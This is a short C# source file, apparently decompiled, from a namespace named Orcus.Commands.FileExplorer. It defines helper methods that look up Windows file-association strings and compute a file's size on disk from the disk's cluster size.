using System;
using System.ComponentModel;
using System.IO;
using System.Text;
using Orcus.Native;

namespace Orcus.Commands.FileExplorer;

public static class FileHelper
{
	public static string AssocQueryString(AssocStr association, string extension)
	{
		uint pcchOut = 0u;
		if (NativeMethods.AssocQueryString(AssocF.None, association, extension, null, null, ref pcchOut) != 1)
		{
			throw new InvalidOperationException("Could not determine associated string");
		}
		StringBuilder stringBuilder = new StringBuilder((int)pcchOut);
		if (NativeMethods.AssocQueryString(AssocF.None, association, extension, null, stringBuilder, ref pcchOut) != 0)
		{
			throw new InvalidOperationException("Could not determine associated string");
		}
		return stringBuilder.ToString();
	}

	public static long GetFileSizeOnDisk(string file)
	{
		return GetFileSizeOnDisk(new FileInfo(file));
	}

	public static long GetFileSizeOnDisk(FileInfo fileInfo)
	{
		if (NativeMethods.GetDiskFreeSpaceW(fileInfo.Directory!.Root.FullName, out var lpSectorsPerCluster, out var lpBytesPerSector, out var lpNumberOfFreeClusters, out lpNumberOfFreeClusters) == 0)
		{
			throw new Win32Exception();
		}
		uint num = lpSectorsPerCluster * lpBytesPerSector;
		uint lpFileSizeHigh;
		uint compressedFileSizeW = NativeMethods.GetCompressedFileSizeW(fileInfo.FullName, out lpFileSizeHigh);
		return (long)((((ulong)lpFileSizeHigh << 32) | compressedFileSizeW) + num - 1L) / (long)num * num;
	}
}
